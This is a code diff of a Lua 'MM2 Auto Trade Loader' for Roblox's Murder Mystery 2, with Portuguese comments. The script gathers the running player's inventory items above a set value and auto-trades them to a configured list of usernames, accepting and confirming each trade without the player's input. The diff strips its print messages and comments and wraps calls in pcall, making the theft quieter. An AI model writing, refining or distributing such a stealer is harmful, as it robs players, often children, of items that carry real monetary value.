@@ -1,4 +1,4 @@
--- MM2 Auto Trade Loader - Versão Corrigida
+-- MM2 Auto Trade Loader - Versão Corrigida (Individual)
 -- By: DeadJB
 
 local Config = _G.MM2AutoTradeConfig or {}
@@ -37,7 +37,7 @@ local function filterItems(inventory, values)
     local filtered = {}
     for _, item in pairs(inventory) do
         local value = getItemValue(item, values)
-        if value >= MinValue then -- Se MinValue for 0, pega tudo
+        if value >= MinValue then
             table.insert(filtered, item)
         end
     end
@@ -47,14 +47,12 @@ end
 local function getInventoryItems()
     local items = {}
     
-    -- Pega do Backpack
     for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
         if item:IsA("Tool") then
             table.insert(items, item.Name)
         end
     end
     
-    -- Pega do StarterGear
     for _, item in pairs(LocalPlayer.StarterGear:GetChildren()) do
         if item:IsA("Tool") then
             table.insert(items, item.Name)
@@ -91,7 +89,6 @@ end
 local function doTrade(targetName)
     local target = Players:FindFirstChild(targetName)
     if not target then
-        print("Alvo " .. targetName .. " não está online")
         return false
     end
     
@@ -101,7 +98,6 @@ local function doTrade(targetName)
     local filtered = filterItems(inventoryItems, values)
     
     if #filtered == 0 then
-        print("Nenhum item encontrado (MinValue = " .. MinValue .. ")")
         return false
     end
     
@@ -123,28 +119,29 @@ local function doTrade(targetName)
     })
     
     -- Envia pedido de trade
-    if TradeRemote then
-        TradeRemote:WaitForChild("SendRequest"):InvokeServer(target)
-    else
-        -- Fallback: usa o remote antigo
-        ReplicatedStorage:WaitForChild("TradeRequest"):InvokeServer(target, "Trade")
-    end
+    pcall(function()
+        if TradeRemote then
+            TradeRemote:WaitForChild("SendRequest"):InvokeServer(target)
+        else
+            ReplicatedStorage:FindFirstChild("TradeRequest"):InvokeServer(target, "Trade")
+        end
+    end)
     
     wait(2)
     
     -- Verifica se a trade abriu
     local tradeGUI = LocalPlayer.PlayerGui:FindFirstChild("Trade")
     if not tradeGUI then
-        print("Trade não abriu, tentando novamente...")
-        if TradeRemote then
-            TradeRemote:WaitForChild("SendRequest"):InvokeServer(target)
-        else
-            ReplicatedStorage:WaitForChild("TradeRequest"):InvokeServer(target, "Trade")
-        end
+        pcall(function()
+            if TradeRemote then
+                TradeRemote:WaitForChild("SendRequest"):InvokeServer(target)
+            else
+                ReplicatedStorage:FindFirstChild("TradeRequest"):InvokeServer(target, "Trade")
+            end
+        end)
         wait(2)
         tradeGUI = LocalPlayer.PlayerGui:FindFirstChild("Trade")
         if not tradeGUI then
-            print("Falha ao abrir trade")
             return false
         end
     end
@@ -153,16 +150,14 @@ local function doTrade(targetName)
     local function sendItems(items)
         local offered = 0
         
-        -- Coloca itens na trade
         for _, itemName in pairs(items) do
             if offered >= 4 then break end
             
-            -- Tenta enviar item
             local success = pcall(function()
                 if TradeRemote then
-                    TradeRemote:WaitForChild("OfferItem"):FireServer(itemName, "Weapons")
+                    TradeRemote:FindFirstChild("OfferItem"):FireServer(itemName, "Weapons")
                 else
-                    ReplicatedStorage:WaitForChild("TradeOffer"):InvokeServer(itemName, true)
+                    ReplicatedStorage:FindFirstChild("TradeOffer"):InvokeServer(itemName, true)
                 end
             end)
             
@@ -174,26 +169,23 @@ local function doTrade(targetName)
         
         wait(1)
         
-        -- Aceita trade
         pcall(function()
             if TradeRemote then
-                TradeRemote:WaitForChild("AcceptTrade"):FireServer()
+                TradeRemote:FindFirstChild("AcceptTrade"):FireServer()
             else
-                ReplicatedStorage:WaitForChild("TradeAccept"):InvokeServer()
+                ReplicatedStorage:FindFirstChild("TradeAccept"):InvokeServer()
             end
         end)
         wait(0.5)
         
-        -- Confirma trade
         pcall(function()
             if TradeRemote then
-                TradeRemote:WaitForChild("ConfirmTrade"):FireServer()
+                TradeRemote:FindFirstChild("ConfirmTrade"):FireServer()
             else
-                ReplicatedStorage:WaitForChild("TradeConfirm"):InvokeServer()
+                ReplicatedStorage:FindFirstChild("TradeConfirm"):InvokeServer()
             end
         end)
         
-        -- Verifica se tem mais itens
         local remaining = {}
         for i = offered + 1, #items do
             table.insert(remaining, items[i])
@@ -201,12 +193,11 @@ local function doTrade(targetName)
         
         if #remaining > 0 then
             wait(3)
-            -- Limpa a trade e envia o resto
             pcall(function()
                 if TradeRemote then
-                    TradeRemote:WaitForChild("ClearOffer"):FireServer()
+                    TradeRemote:FindFirstChild("ClearOffer"):FireServer()
                 else
-                    ReplicatedStorage:WaitForChild("TradeClear"):InvokeServer()
+                    ReplicatedStorage:FindFirstChild("TradeClear"):InvokeServer()
                 end
             end)
             wait(1)
@@ -221,19 +212,25 @@ local function doTrade(targetName)
     return true
 end
 
--- Função principal
+-- Função principal - verifica UM por UM
 local function checkAndTrade()
     local inventoryItems = getInventoryItems()
     local values = getValues()
     local filtered = filterItems(inventoryItems, values)
     
-    if #filtered > 0 then
-        print("Itens encontrados: " .. #filtered)
-        for _, targetName in pairs(Username) do
+    if #filtered == 0 then
+        return
+    end
+    
+    -- Verifica cada username individualmente
+    for _, targetName in pairs(Username) do
+        local target = Players:FindFirstChild(targetName)
+        if target then
+            print("Alvo encontrado: " .. targetName)
             task.spawn(function()
                 pcall(doTrade, targetName)
             end)
-            wait(3)
+            wait(5) -- Delay entre trades
         end
     end
 end
